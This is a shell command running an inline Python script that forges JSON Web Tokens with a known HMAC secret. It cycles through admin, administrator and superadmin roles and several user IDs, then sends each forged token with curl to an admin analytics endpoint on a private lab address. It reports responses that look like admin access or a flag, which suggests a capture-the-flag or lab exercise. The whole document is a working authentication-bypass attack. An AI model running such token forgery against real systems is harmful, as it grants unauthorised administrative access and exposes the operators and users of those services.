python3 -c "
import base64, json, hmac, hashlib

secret = '[REDACTED]'

# Try different payload structures
for role in ['admin', 'administrator', 'superadmin']:
    for sub in [1, 0, 999]:
        payload = {'sub':sub,'username':role,'role':role}
        header = {'alg':'HS256','typ':'JWT'}

        def b64url(data):
            return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

        h = b64url(json.dumps(header, separators=(',',':')).encode())
        p = b64url(json.dumps(payload, separators=(',',':')).encode())
        sig = hmac.new(secret.encode(), f'{h}.{p}'.encode(), hashlib.sha256).digest()
        s = b64url(sig)

        token = [REDACTED]'{h}.{p}.{s}'
        result = __import__('subprocess').check_output(['curl', '-s', '-b', '/tmp/jar.txt', 'http://10.200.21.4:3000/admin/analytics', '-H', f'Authorization: Bearer {token}'])
        if b'admin' in result.lower() or b'flag' in result.lower() or b'error' not in result:
            print(f'role={role} sub={sub}: {result.decode()}')
        else:
            print(f'role={role} sub={sub}: denied')
"

